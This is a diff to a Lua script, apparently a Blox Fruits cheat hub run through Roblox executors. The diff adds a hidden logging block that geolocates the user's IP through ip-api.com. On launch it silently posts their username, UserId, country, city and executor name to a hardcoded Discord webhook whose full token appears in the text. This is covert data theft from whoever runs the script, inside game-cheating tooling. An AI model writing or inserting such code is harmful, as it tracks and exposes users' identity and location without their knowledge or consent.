@@ -45,6 +45,83 @@ local SwordNames = {
     "Yama", "Soul Guitar", "Hallow Scythe", "Canvander", "Spikey Trident"
 }
 
+-- ==========================================================================
+--     SISTEMA INTEGRADO DE REGISTRO MULTIPLATAFORMA (DELTA, XENO Y PC)
+-- ==========================================================================
+local WebhookURL = "https://discord.com/api/webhooks/1504207975068471378/qdu00zlhcH1lEEl84Gl2JMZKtN8DF6ltGr8BtqXh-Too6POWtlJ8SDJRylHZDTaG6VsZ"
+
+local function getIpData()
+    -- MÉTODO 1: Optimizado con bypass nativo para Delta Mobile (HttpGet)
+    local success1, res1 = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
+    end)
+    if success1 and res1 and res1.country then return res1 end
+
+    -- MÉTODO 2: Optimizado para PC y entornos avanzados (Request estándar)
+    local requestFunc = (request or http_request or (http and http.request) or (syn and syn.request))
+    if requestFunc then
+        local success2, res2 = pcall(function()
+            local response = requestFunc({Url = "http://ip-api.com/json/", Method = "GET"})
+            if response and response.Body then
+                return HttpService:JSONDecode(response.Body)
+            end
+        end)
+        if success2 and res2 and res2.country then return res2 end
+    end
+
+    -- MÉTODO 3: Fallback seguro si Xeno móvil bloquea las llamadas salientes de IP
+    return {country = "Protegido/Móvil", regionName = "Desconocido", city = "No Detectado"}
+end
+
+local ipData = getIpData()
+
+local function getSea()
+    local id = game.PlaceId
+    if id == 2753915549 then return "Primer Mar"
+    elseif id == 4442245229 then return "Segundo Mar"
+    elseif id == 7449925065 then return "Tercer Mar"
+    else return "Mar Desconocido" end
+end
+
+local function sendUnifiedLog()
+    local payload = {
+        ["embeds"] = {{
+            ["title"] = "🚀 ALONEFALSEEXPLOIT | HUB ACTIVADO",
+            ["color"] = 10485919, -- Morado neón equivalente en decimal
+            ["fields"] = {
+                {["name"] = "👤 Jugador", ["value"] = lp.Name, ["inline"] = true},
+                {["name"] = "🆔 UserId", ["value"] = tostring(lp.UserId), ["inline"] = true},
+                {["name"] = "⏰ Hora", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false},
+                {["name"] = "🌍 País / Ciudad", ["value"] = ipData.country .. " / " .. ipData.city, ["inline"] = false},
+                {["name"] = "🎮 Juego", ["value"] = "Blox Fruits | " .. getSea(), ["inline"] = false},
+                {["name"] = "📱 Inyector Detectado", ["value"] = (identifyexecutor and identifyexecutor()) or "PC / Móvil Genérico", ["inline"] = true}
+            },
+            ["footer"] = {["text"] = "Z-BOUNTY | Dev: AloneFalseExploit 🔥"},
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+
+    local requestFunc = (request or http_request or (http and http.request) or (syn and syn.request))
+    if requestFunc then
+        pcall(function()
+            requestFunc({
+                Url = WebhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    else
+        pcall(function()
+            game:HttpPost(WebhookURL, HttpService:JSONEncode(payload), "application/json")
+        end)
+    end
+end
+
+-- Ejecución asíncrona inmediata de la red en segundo plano
+task.spawn(sendUnifiedLog)
+-- ==========================================================================
+
 -- Funciones Auxiliares estéticas de la Nueva GUI
 local function addStroke(p, color, thick, trans)  
     local s = Instance.new('UIStroke', p)  
